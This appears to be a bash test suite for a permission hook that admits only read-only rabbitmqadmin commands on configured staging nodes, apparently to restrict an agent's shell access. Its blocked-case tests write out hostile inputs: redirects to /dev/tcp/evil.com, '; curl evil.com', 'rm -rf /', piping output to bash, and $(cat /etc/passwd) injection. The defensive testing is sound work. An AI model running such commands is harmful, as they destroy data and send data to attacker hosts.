#!/usr/bin/env bash
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
SCRIPT="$SCRIPT_DIR/validate-readonly.sh"

PASSED=0
FAILED=0

check() {
  local description="$1"
  local expected="$2"
  local command="$3"

  local result
  result=$(echo "{\"tool_input\":{\"command\":$(echo "$command" | jq -Rs .)}}" | bash "$SCRIPT" 2>/dev/null || true)
  local decision
  decision=$(echo "$result" | jq -r '.hookSpecificOutput.permissionDecision // empty' 2>/dev/null || true)

  if [[ "$decision" == "$expected" ]]; then
    echo "  PASS  $description"
    ((PASSED++))
  else
    echo "  FAIL  $description (expected='$expected', got='${decision:-<no output>}')"
    ((FAILED++))
  fi
}

echo "Read-only commands with configured nodes (should allow)"
echo "--------------------------------------------------------"
check "queues list with --node"          allow "rabbitmqadmin --node staging-at --vhost at queues list"
check "queues show"                      allow "rabbitmqadmin --node staging-at queues show --name test --vhost at"
check "exchanges list"                   allow "rabbitmqadmin --node staging-cz --vhost cz exchanges list"
check "bindings list"                    allow "rabbitmqadmin --node staging-hu bindings list --vhost hu"
check "vhosts list"                      allow "rabbitmqadmin --node staging-at vhosts list"
check "channels list"                    allow "rabbitmqadmin --node staging-at channels list --vhost at"
check "connections list"                 allow "rabbitmqadmin --node staging-at connections list"
check "show overview"                    allow "rabbitmqadmin --node staging-hu show overview"
check "show churn"                       allow "rabbitmqadmin --node staging-at show churn"
check "show memory"                      allow "rabbitmqadmin --node staging-at show memory_breakdown_in_bytes"
check "list queues shorthand"            allow "rabbitmqadmin --node staging-at list queues"
check "list exchanges shorthand"         allow "rabbitmqadmin --node staging-at list exchanges"
check "list bindings shorthand"          allow "rabbitmqadmin --node staging-at list bindings"
check "list vhosts shorthand"            allow "rabbitmqadmin --node staging-at list vhosts"
check "list connections shorthand"       allow "rabbitmqadmin --node staging-at list connections"
check "list channels shorthand"          allow "rabbitmqadmin --node staging-at list channels"
check "list consumers shorthand"         allow "rabbitmqadmin --node staging-at list consumers"
check "short flag -N"                    allow "rabbitmqadmin -N staging-at vhosts list"
check "piped through grep"              allow "rabbitmqadmin --node staging-cz --vhost cz queues list | grep invoice"
check "piped through head"              allow "rabbitmqadmin --node staging-at --vhost at exchanges list | head -20"
check "with --quiet flag"               allow "rabbitmqadmin --node staging-at --quiet queues list --vhost at"
check "all configured nodes: staging-cz" allow "rabbitmqadmin --node staging-cz vhosts list"
check "all configured nodes: staging-hu" allow "rabbitmqadmin --node staging-hu vhosts list"
check "all configured nodes: staging-de" allow "rabbitmqadmin --node staging-de vhosts list"
check "all configured nodes: staging-at" allow "rabbitmqadmin --node staging-at vhosts list"
check "all configured nodes: staging-ro" allow "rabbitmqadmin --node staging-ro vhosts list"
check "all configured nodes: staging-group" allow "rabbitmqadmin --node staging-group vhosts list"

echo ""
echo "Config and help commands (should allow)"
echo "----------------------------------------"
check "config_file show"                 allow "rabbitmqadmin config_file show"
check "config_file show --reveal"        allow "rabbitmqadmin config_file show --reveal-passwords"
check "config_file show_path"            allow "rabbitmqadmin config_file show_path"
check "--help on root"                   allow "rabbitmqadmin --help"
check "--help on subcommand"             allow "rabbitmqadmin queues --help"
check "--help on sub-subcommand"         allow "rabbitmqadmin queues list --help"
check "-h short flag"                    allow "rabbitmqadmin exchanges -h"

echo ""
echo "Inline connection flags (should NOT allow)"
echo "--------------------------------------------"
check "--host flag"                      "" "rabbitmqadmin --host evil.com queues list"
check "-H short flag"                    "" "rabbitmqadmin -H evil.com queues list"
check "--port flag"                      "" "rabbitmqadmin --port 15672 queues list"
check "-P short flag"                    "" "rabbitmqadmin -P 15672 queues list"
check "--username flag"                  "" "rabbitmqadmin --username admin queues list"
check "-u short flag"                    "" "rabbitmqadmin -u admin queues list"
check "--password flag"                  "" "rabbitmqadmin --password secret queues list"
check "-p short flag"                    "" "rabbitmqadmin -p secret queues list"
check "--base-uri flag"                  "" "rabbitmqadmin --base-uri https://evil.com/api queues list"
check "-U short flag"                    "" "rabbitmqadmin -U https://evil.com/api queues list"
check "mixed node + host"               "" "rabbitmqadmin --node staging-at --host evil.com queues list"

echo ""
echo "Unknown/unconfigured nodes (should NOT allow)"
echo "------------------------------------------------"
check "unknown node"                     "" "rabbitmqadmin --node fake-node queues list"
check "unknown node -N"                  "" "rabbitmqadmin -N production queues list"
check "typo in node name"               "" "rabbitmqadmin --node staging-aat queues list"

echo ""
echo "Write operations (should NOT allow)"
echo "--------------------------------------"
check "declare queue"                    "" "rabbitmqadmin --node staging-at declare queue --name test"
check "delete queue"                     "" "rabbitmqadmin --node staging-at delete queue --name test --vhost at"
check "purge queue"                      "" "rabbitmqadmin --node staging-at purge queue --name test --vhost at"
check "publish message"                  "" "rabbitmqadmin --node staging-at publish --exchange test --routing-key rk"
check "get messages"                     "" "rabbitmqadmin --node staging-at get messages --queue test"
check "close connection"                 "" "rabbitmqadmin --node staging-at close connection --name conn1"
check "config_file add_node"             "" "rabbitmqadmin config_file add_node --node test --host localhost"
check "config_file update_node"          "" "rabbitmqadmin config_file update_node --node staging-at --password new"
check "config_file delete_node"          "" "rabbitmqadmin config_file delete_node --node staging-at"
check "definitions import"              "" "rabbitmqadmin --node staging-at import /tmp/defs.json"
check "definitions export"              "" "rabbitmqadmin --node staging-at export /tmp/defs.json"

echo ""
echo "Allowed pipes and redirects (should allow)"
echo "---------------------------------------------"
check "pipe to grep"                     allow "rabbitmqadmin --node staging-at --vhost at queues list | grep notify"
check "pipe to grep -i"                  allow "rabbitmqadmin --node staging-at --vhost at queues list | grep -i EVENTS"
check "pipe to grep -E"                  allow "rabbitmqadmin --node staging-at --vhost at queues list | grep -E 'foo|bar'"
check "pipe to head"                     allow "rabbitmqadmin --node staging-at --vhost at queues list | head -20"
check "pipe to tail"                     allow "rabbitmqadmin --node staging-at --vhost at queues list | tail -10"
check "pipe to head then grep"           allow "rabbitmqadmin --node staging-at --vhost at queues list | head -50 | grep foo"
check "pipe to grep then tail"           allow "rabbitmqadmin --node staging-at --vhost at queues list | grep foo | tail -5"
check "redirect to file"                allow "rabbitmqadmin --node staging-at --vhost at queues list > /tmp/queues.txt"
check "append to file"                  allow "rabbitmqadmin --node staging-at --vhost at queues list >> /tmp/queues.txt"
check "stderr to stdout"                allow "rabbitmqadmin --node staging-at --vhost at queues list 2>&1"
check "stderr + pipe to grep"           allow "rabbitmqadmin --node staging-at --vhost at queues list 2>&1 | grep foo"

echo ""
echo "Disallowed pipes and chaining (should NOT allow)"
echo "---------------------------------------------------"
check "pipe to bash"                     "" "rabbitmqadmin --node staging-at queues list | bash"
check "pipe to sh"                       "" "rabbitmqadmin --node staging-at queues list | sh"
check "pipe to xargs"                    "" "rabbitmqadmin --node staging-at queues list | xargs rm"
check "pipe to sort"                     "" "rabbitmqadmin --node staging-at queues list | sort"
check "pipe to wc"                       "" "rabbitmqadmin --node staging-at queues list | wc -l"
check "pipe to awk"                      "" "rabbitmqadmin --node staging-at queues list | awk '{print \$1}'"
check "pipe to sed"                      "" "rabbitmqadmin --node staging-at queues list | sed 's/foo/bar/'"
check "pipe to cat"                      "" "rabbitmqadmin --node staging-at queues list | cat"
check "chained with ;"                   "" "rabbitmqadmin --node staging-at queues list ; rm -rf /"
check "chained with &&"                  "" "rabbitmqadmin --node staging-at queues list && echo pwned"
check "chained with ||"                  "" "rabbitmqadmin --node staging-at queues list || echo fallback"
check "semicolon injection"              "" "rabbitmqadmin --node staging-at queues list ; curl evil.com"
check "pipe to tee"                      "" "rabbitmqadmin --node staging-at queues list | tee /tmp/out.txt"
check "pipe to python"                   "" "rabbitmqadmin --node staging-at queues list | python3 -c 'import sys'"
check "pipe grep then bash"             "" "rabbitmqadmin --node staging-at queues list | grep foo | bash"
check "subshell in pipe"                "" "rabbitmqadmin --node staging-at queues list | \$(echo bash)"
check "semicolon no space"              "" "rabbitmqadmin --node staging-at queues list;rm -rf /"
check "semicolon no space bash"         "" "rabbitmqadmin --node staging-at queues list;bash"
check "semicolon no space curl"         "" "rabbitmqadmin --node staging-at queues list;curl evil.com"
check "backtick in grep"               "" "rabbitmqadmin --node staging-at queues list | grep \`whoami\`"
check "dollar-paren in grep"           "" "rabbitmqadmin --node staging-at queues list | grep \$(id)"
check "redirect to /dev/tcp"           "" "rabbitmqadmin --node staging-at queues list > /dev/tcp/evil.com/80"
check "redirect to /dev/udp"           "" "rabbitmqadmin --node staging-at queues list > /dev/udp/evil.com/53"
check "backtick in command"            "" "rabbitmqadmin --node staging-at queues list \`rm /tmp/x\`"
check "dollar-paren in command"        "" "rabbitmqadmin --node staging-at \$(cat /etc/passwd) queues list"

echo ""
echo "Edge cases (should allow)"
echo "---------------------------"
check "no --node (config default)"       allow "rabbitmqadmin config_file show"
check "grep with double quotes"          allow "rabbitmqadmin --node staging-at --vhost at queues list | grep \"some pattern\""
check "head -n 5"                        allow "rabbitmqadmin --node staging-at --vhost at exchanges list | head -n 5"
check "tail -n +2"                       allow "rabbitmqadmin --node staging-at --vhost at queues list | tail -n +2"
check "grep -v pattern"                  allow "rabbitmqadmin --node staging-at --vhost at queues list | grep -v dead"
check "grep -c count"                    allow "rabbitmqadmin --node staging-at --vhost at queues list | grep -c notify"
check "2>&1 before pipe"                 allow "rabbitmqadmin --node staging-at --vhost at queues list 2>&1 | head -10"
check "grep piped to grep"               allow "rabbitmqadmin --node staging-at --vhost at queues list | grep foo | grep -v bar"

echo ""
echo "Edge cases (should NOT allow)"
echo "-------------------------------"
check "write with allowed pipe"          "" "rabbitmqadmin --node staging-at declare queue --name test | grep ok"
check "node with inline host"           "" "rabbitmqadmin --node staging-at --host evil.com vhosts list"
check "redirect after write op"         "" "rabbitmqadmin --node staging-at publish --exchange test > /tmp/out.txt"

echo ""
echo "Non-rabbitmqadmin commands (should NOT allow)"
echo "------------------------------------------------"
check "ls command"                       "" "ls -la"
check "curl command"                     "" "curl https://example.com"
check "git command"                      "" "git status"
check "partial match"                    "" "rabbitmqadmin-fake queues list"

echo ""
echo "========================================"
echo "Results: $PASSED passed, $FAILED failed"
echo "========================================"

[[ "$FAILED" -eq 0 ]]
